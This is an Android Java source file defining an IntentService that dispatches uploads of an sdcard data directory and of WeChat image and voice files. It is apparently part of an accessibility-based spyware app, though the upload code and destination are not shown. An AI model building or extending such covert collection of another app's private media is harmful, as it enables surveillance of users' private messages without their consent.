package test.com.accessibility.base.main;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;

import test.com.accessibility.base.IntentInterface.intentInterface;
import test.com.accessibility.core.upload.sdcardDataDirUpload;
import test.com.accessibility.core.wechat.wechatFileUpload;

public class UploadIntentService extends IntentService {

    public UploadIntentService() {
        super("UploadIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            final String action = intent.getAction();
            if (intentInterface.UploadService_Action_DataDir.equals(action)) {
                String sdcardDataDir = intent.getStringExtra(intentInterface.UploadService_Action_DataDir_Param_RootDir);
                sdcardDataDirUpload.Uploading(this, sdcardDataDir);
            } else if (intentInterface.UploadService_Action_WechatImageDir.equals(action)) {
                wechatFileUpload.imageUploading(this);
            } else if (intentInterface.UploadService_Action_WechatVoiceDir.equals(action)) {
                wechatFileUpload.voiceUploading(this);
            }
        }
    }
}
